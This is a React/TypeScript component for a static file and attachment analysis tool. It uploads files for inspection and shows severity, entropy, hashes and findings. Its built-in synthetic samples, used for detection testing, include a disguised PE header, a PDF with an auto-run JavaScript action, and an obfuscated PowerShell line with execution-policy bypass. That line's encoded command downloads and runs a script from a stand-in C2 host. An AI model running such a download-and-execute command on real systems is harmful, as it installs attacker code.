import { DetectorUpload } from '../components/analysis/DetectorUpload';
import { apiFetch } from '../utils/apiClient';
import React, { useState } from 'react';
import {
  Binary,
  AlertTriangle,
  Play,
  RotateCcw,
  FileSearch,
  Hash,
  Layers,
  FileWarning,
} from 'lucide-react';
import { apiUrl } from '../utils/apiClient';

interface FileAnalysisResult {
  artifact_id: string;
  classification: string;
  summary: string;
  filename: string;
  sha256: string;
  sha1: string;
  md5: string;
  size_bytes: number;
  claimed_extension: string;
  detected_mime_type: string;
  is_type_disguised: boolean;
  shannon_entropy: number;
  is_packed_or_encrypted: boolean;
  overall_risk_score: number;
  overall_severity: 'SAFE' | 'LOW' | 'MEDIUM' | 'HIGH' | 'CRITICAL';
  threat_intel_verdict: string;
  format_details: {
    pe_details?: any;
    pdf_details?: any;
    office_details?: any;
    script_details?: any;
    archive_details?: any;
  };
  findings: Array<{
    finding_type: string;
    title: string;
    description: string;
    severity: string;
    confidence: number;
  }>;
}

const SAMPLE_FILES = {
  disguised: {
    name: 'Disguised PE Binary (invoice.pdf.exe)',
    filename: 'invoice.pdf.exe',
    description: 'Double extension attack: claims to be a PDF document but header contains PE32 executable magic bytes MZ.',
    content: 'MZ\x90\x00\x03\x00\x00\x00\x04\x00\x00\x00\xff\xff\x00\x00This program cannot be run in DOS mode. Powershell -enc JABzACAAPQAgAE4AZQB3AC0ATwBiAGoAZQBjAHQA...',
  },
  malicious_pdf: {
    name: 'PDF with Malicious JavaScript Stream',
    filename: 'statement.pdf',
    description: 'PDF containing suspicious /JavaScript and /OpenAction trigger to execute script upon viewing.',
    content: '%PDF-1.4\n1 0 obj\n<< /Type /Catalog /Pages 2 0 R /OpenAction 4 0 R >>\nendobj\n4 0 obj\n<< /Type /Action /S /JavaScript /JS (app.alert("compromised");) >>\nendobj\n%%EOF',
  },
  powershell: {
    name: 'Obfuscated PowerShell Script',
    filename: 'update_patch.ps1',
    description: 'Script utilizing execution policy bypass flags, encoded commands, and web client downloads.',
    content: '# CyberGuard Test Script\npowershell.exe -ExecutionPolicy Bypass -NoProfile -WindowStyle Hidden -EncodedCommand aQBlAHgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AYwAyAC4AbQBhAGwAaQBjAGkAbwB1AHMALgB0AG8AcAAvAHAAJwApAA==',
  },
  clean_pdf: {
    name: 'PDF structure control',
    filename: 'financial_quarterly_report.pdf',
    description: 'Standard benign PDF document with linear page tree and zero embedded executable streams.',
    content: '%PDF-1.7\n1 0 obj\n<< /Type /Catalog /Pages 2 0 R >>\nendobj\n2 0 obj\n<< /Type /Pages /Kids [3 0 R] /Count 1 >>\nendobj\n3 0 obj\n<< /Type /Page /Parent 2 0 R /Contents 4 0 R >>\nendobj\n4 0 obj\n<< /Length 44 >>\nstream\nBT /F1 12 Tf 72 712 Td (Quarterly Report) Tj ET\nendstream\nendobj\nxref\n0 5\n0000000000 65535 f \ntrailer\n<< /Size 5 /Root 1 0 R >>\nstartxref\n350\n%%EOF',
  }
};

export const FileSecurityView: React.FC = () => {
  const [selectedSampleKey, setSelectedSampleKey] = useState<keyof typeof SAMPLE_FILES>('disguised');
  const [filename, setFilename] = useState<string>(SAMPLE_FILES.disguised.filename);
  const [contentPayload, setContentPayload] = useState<string>(SAMPLE_FILES.disguised.content);
  const [isAnalyzing, setIsAnalyzing] = useState(false);
  const [result, setResult] = useState<FileAnalysisResult | null>(null);
  const [errorMsg, setErrorMsg] = useState<string | null>(null);

  const handleSampleChange = (key: keyof typeof SAMPLE_FILES) => {
    setSelectedSampleKey(key);
    setFilename(SAMPLE_FILES[key].filename);
    setContentPayload(SAMPLE_FILES[key].content);
    setResult(null);
    setErrorMsg(null);
  };

  const handleAnalyze = async (uploadedFile?: File) => {
    setIsAnalyzing(true);
    setErrorMsg(null);
    setResult(null);
    try {
      const blob = new Blob([contentPayload], { type: 'application/octet-stream' });
      const formData = new FormData();
      formData.append('file', uploadedFile ?? blob, uploadedFile?.name ?? filename);

      const res = await apiFetch(apiUrl('/api/files/analyze'), {
        method: 'POST',
        body: formData,
      });

      if (!res.ok) {
        const errData = await res.json().catch(() => ({}));
        throw new Error(errData.detail || `File inspection failed with status ${res.status}`);
      }

      const data = await res.json();
      if (!Number.isFinite(data.risk_score) || !Number.isFinite(data.entropy?.entropy) || !data.identity) {
        throw new Error('File analysis response is incomplete; no safety conclusion can be displayed.');
      }
      setResult({
        artifact_id: data.artifact_id, classification: data.classification, summary: data.summary,
        filename: data.identity.original_filename, sha256: data.identity.sha256,
        sha1: data.identity.sha1, md5: data.identity.md5, size_bytes: data.identity.size_bytes,
        claimed_extension: data.identity.claimed_extension, detected_mime_type: data.identity.detected_mime,
        is_type_disguised: data.findings.some((finding: { finding_type: string }) => finding.finding_type === 'FILE_TYPE_MISMATCH'),
        shannon_entropy: data.entropy.entropy, is_packed_or_encrypted: data.entropy.is_high_entropy,
        overall_risk_score: data.risk_score, overall_severity: data.severity,
        threat_intel_verdict: data.reputation.verdict,
        format_details: { pe_details: data.pe_metadata, pdf_details: data.pdf_metadata,
          office_details: data.office_metadata, script_details: data.script_metadata, archive_details: data.archive_metadata },
        findings: data.findings,
      });
    } catch (err: any) {
      setErrorMsg(err.message || 'An error occurred during static file security analysis.');
    } finally {
      setIsAnalyzing(false);
    }
  };

  const getSeverityBadgeClass = (sev: string) => {
    switch (sev) {
      case 'CRITICAL':
        return 'bg-red-500/10 text-red-500 border-red-500/30';
      case 'HIGH':
        return 'bg-amber-500/10 text-amber-500 border-amber-500/30';
      case 'MEDIUM':
        return 'bg-yellow-500/10 text-yellow-500 border-yellow-500/30';
      case 'LOW':
        return 'bg-blue-500/10 text-blue-500 border-blue-500/30';
      default:
        return 'bg-emerald-500/10 text-emerald-500 border-emerald-500/30';
    }
  };

  return (
    <div className="max-w-6xl w-full mx-auto py-6 px-4 space-y-6">
      {/* Header */}
      <div className="flex flex-col md:flex-row md:items-center justify-between gap-4 border-b border-border pb-6">
        <div>
          <div className="flex items-center space-x-2.5">
            <div className="w-9 h-9 rounded-lg bg-primary/10 border border-primary/20 flex items-center justify-center text-primary">
              <Binary className="w-5 h-5" />
            </div>
            <div>
              <h1 className="text-xl font-bold tracking-tight text-foreground">
                Files & attachment analysis
              </h1>
              <p className="text-xs text-foreground-muted font-mono">
                Inspect file bytes, metadata and embedded references. Static signals do not establish safety.
              </p>
            </div>
          </div>
        </div>

        <div className="flex items-center space-x-2">
          <span className="text-[11px] font-mono px-2.5 py-1 rounded-badge bg-surface-secondary border border-border text-foreground-muted">
            No file execution
          </span>
          <span className="text-[11px] font-mono px-2.5 py-1 rounded-badge bg-primary/10 border border-primary/30 text-primary font-semibold">
            Static checks
          </span>
        </div>
      </div>

      <DetectorUpload title="Upload a file or attachment" description="Analyze original file bytes with static checks. Files are never executed." busy={isAnalyzing} onAnalyze={handleAnalyze} />

      {/* Preset Samples */}
      <div className="bg-surface rounded-card border border-border p-4 space-y-3">
        <div className="flex items-center justify-between">
          <span className="text-xs font-mono font-semibold uppercase text-foreground-subtle tracking-wider flex items-center gap-1.5">
            <FileSearch className="w-3.5 h-3.5 text-primary" />
            Synthetic File & Binary Samples
          </span>
          <span className="text-[11px] text-foreground-muted">Safe static content</span>
        </div>

        <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-4 gap-2.5">
          {(Object.keys(SAMPLE_FILES) as Array<keyof typeof SAMPLE_FILES>).map((key) => {
            const sample = SAMPLE_FILES[key];
            const isSelected = selectedSampleKey === key;
            return (
              <button
                key={key}
                onClick={() => handleSampleChange(key)}
                className={`p-2.5 rounded-lg border text-left transition-all cursor-pointer ${
                  isSelected
                    ? 'bg-primary/10 border-primary text-foreground shadow-xs'
                    : 'bg-surface-secondary/60 border-border hover:border-border-subtle text-foreground-muted hover:text-foreground'
                }`}
              >
                <div className="text-xs font-semibold">{sample.name}</div>
                <div className="text-[10px] text-foreground-muted truncate mt-0.5">{sample.description}</div>
              </button>
            );
          })}
        </div>
      </div>

      {/* Input Form */}
      <div className="bg-surface rounded-card border border-border p-4 space-y-3">
        <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-3">
          <div className="flex-1">
            <label className="text-xs font-mono text-foreground-muted block mb-1">Target Filename</label>
            <input
              type="text"
              value={filename}
              onChange={(e) => setFilename(e.target.value)}
              className="w-full font-mono text-xs px-3 py-1.5 rounded-lg bg-surface-secondary border border-border text-foreground focus:outline-none focus:border-primary"
            />
          </div>
          <div className="flex items-end space-x-2 pt-2 sm:pt-0">
            <button
              onClick={() => handleSampleChange(selectedSampleKey)}
              className="px-2.5 py-1.5 text-xs rounded border border-border bg-surface hover:bg-surface-secondary text-foreground-muted transition-colors flex items-center gap-1 cursor-pointer"
            >
              <RotateCcw className="w-3 h-3" />
              Reset
            </button>
            <button
              onClick={() => void handleAnalyze()}
              disabled={isAnalyzing}
              className="px-4 py-1.5 text-xs font-semibold rounded bg-primary text-primary-foreground hover:bg-primary/90 transition-all flex items-center gap-1.5 cursor-pointer disabled:opacity-50"
            >
              <Play className="w-3.5 h-3.5 fill-current" />
              {isAnalyzing ? 'Inspecting Bytecode...' : 'Inspect Static File'}
            </button>
          </div>
        </div>

        <div>
          <label className="text-xs font-mono text-foreground-muted block mb-1">Raw File Header / Payload Text</label>
          <textarea
            value={contentPayload}
            onChange={(e) => setContentPayload(e.target.value)}
            rows={5}
            className="w-full font-mono text-xs p-3 rounded-lg bg-surface-secondary border border-border text-foreground focus:outline-none focus:border-primary resize-y"
          />
        </div>
      </div>

      {/* Error */}
      {errorMsg && (
        <div className="p-3.5 rounded-lg bg-red-500/10 border border-red-500/30 text-red-500 text-xs flex items-center gap-2">
          <AlertTriangle className="w-4 h-4 shrink-0" />
          <span>{errorMsg}</span>
        </div>
      )}

      {/* Results */}
      {result && (
        <div className="space-y-5 animate-fadeIn">
          {/* Top KPI Cards */}
          <div className="grid grid-cols-2 sm:grid-cols-3 lg:grid-cols-6 gap-3">
            <div className="p-3 rounded-lg bg-surface border border-border space-y-1">
              <span className="text-[10px] font-mono text-foreground-muted uppercase">Overall Severity</span>
              <div className={`text-xs font-bold px-2 py-0.5 rounded border inline-block ${getSeverityBadgeClass(result.overall_severity)}`}>
                {result.overall_severity}
              </div>
            </div>

            <div className="p-3 rounded-lg bg-surface border border-border space-y-1">
              <span className="text-[10px] font-mono text-foreground-muted uppercase">Risk Score</span>
              <div className="text-lg font-bold font-mono text-foreground">
                {result.overall_risk_score.toFixed(1)}<span className="text-xs text-foreground-muted">/100</span>
              </div>
            </div>

            <div className="p-3 rounded-lg bg-surface border border-border space-y-1">
              <span className="text-[10px] font-mono text-foreground-muted uppercase">MIME Type</span>
              <div className="text-xs font-bold font-mono text-foreground truncate" title={result.detected_mime_type}>
                {result.detected_mime_type}
              </div>
            </div>

            <div className="p-3 rounded-lg bg-surface border border-border space-y-1">
              <span className="text-[10px] font-mono text-foreground-muted uppercase">Byte Entropy</span>
              <div className="text-lg font-bold font-mono text-foreground">
                {result.shannon_entropy.toFixed(2)}<span className="text-xs text-foreground-muted">/8.0</span>
              </div>
            </div>

            <div className="p-3 rounded-lg bg-surface border border-border space-y-1">
              <span className="text-[10px] font-mono text-foreground-muted uppercase">Disguised Type</span>
              <div className={`text-xs font-bold font-mono ${result.is_type_disguised ? 'text-red-400' : 'text-emerald-400'}`}>
                {result.is_type_disguised ? 'YES (MISMATCH)' : 'No mismatch found'}
              </div>
            </div>

            <div className="p-3 rounded-lg bg-surface border border-border space-y-1">
              <span className="text-[10px] font-mono text-foreground-muted uppercase">Threat Intel</span>
              <div className="text-xs font-bold font-mono text-foreground truncate">
                {result.threat_intel_verdict}
              </div>
            </div>
          </div>

          {/* Disguised Warning Banner */}
          <div className="rounded-lg border border-border p-4"><strong>{result.classification.replaceAll('_', ' ')}</strong><p className="text-sm text-foreground-muted mt-2">{result.summary}</p></div>

          {result.is_type_disguised && (
            <div className="p-4 rounded-lg bg-red-500/10 border border-red-500/40 text-red-400 flex items-start gap-3">
              <FileWarning className="w-5 h-5 mt-0.5 shrink-0" />
              <div>
                <div className="font-bold text-sm">Disguised Double Extension Detected</div>
                <div className="text-xs opacity-90 mt-0.5">
                  File claimed extension <strong className="underline">{result.claimed_extension}</strong> but magic byte analysis confirmed true type is <strong className="underline">{result.detected_mime_type}</strong>.
                </div>
              </div>
            </div>
          )}

          {/* Cryptographic Hashes Card */}
          <div className="bg-surface rounded-card border border-border p-4 space-y-3">
            <h3 className="text-xs font-mono font-semibold text-foreground uppercase tracking-wider flex items-center gap-1.5">
              <Hash className="w-3.5 h-3.5 text-primary" />
              Cryptographic Hashes & Artifact Identity
            </h3>

            <div className="grid grid-cols-1 md:grid-cols-3 gap-2.5 font-mono text-xs">
              <div className="p-2.5 rounded bg-surface-secondary border border-border">
                <span className="text-[10px] text-foreground-subtle block">SHA-256</span>
                <span className="text-foreground break-all select-all">{result.sha256}</span>
              </div>
              <div className="p-2.5 rounded bg-surface-secondary border border-border">
                <span className="text-[10px] text-foreground-subtle block">SHA-1</span>
                <span className="text-foreground break-all select-all">{result.sha1}</span>
              </div>
              <div className="p-2.5 rounded bg-surface-secondary border border-border">
                <span className="text-[10px] text-foreground-subtle block">MD5</span>
                <span className="text-foreground break-all select-all">{result.md5}</span>
              </div>
            </div>
          </div>

          {/* Findings */}
          <div className="bg-surface rounded-card border border-border p-4 space-y-3">
            <h3 className="text-sm font-semibold text-foreground flex items-center gap-2">
              <Layers className="w-4 h-4 text-primary" />
              Static File Findings ({result.findings.length})
            </h3>

            {result.findings.length === 0 ? (
              <div className="p-6 text-center text-xs text-foreground-muted bg-surface-secondary/50 rounded-lg">
                No suspicious bytecode patterns, macros, or structural anomalies detected.
              </div>
            ) : (
              <div className="space-y-2.5">
                {result.findings.map((f, idx) => (
                  <div key={idx} className="p-3.5 rounded-lg bg-surface-secondary/60 border border-border space-y-1.5">
                    <div className="flex items-center space-x-2">
                      <span className={`text-[10px] font-mono px-2 py-0.5 rounded border font-semibold ${getSeverityBadgeClass(f.severity)}`}>
                        {f.severity}
                      </span>
                      <span className="text-xs font-bold text-foreground">{f.title}</span>
                    </div>
                    <p className="text-xs text-foreground-muted leading-relaxed">
                      {f.description}
                    </p>
                  </div>
                ))}
              </div>
            )}
          </div>
        </div>
      )}
    </div>
  );
};
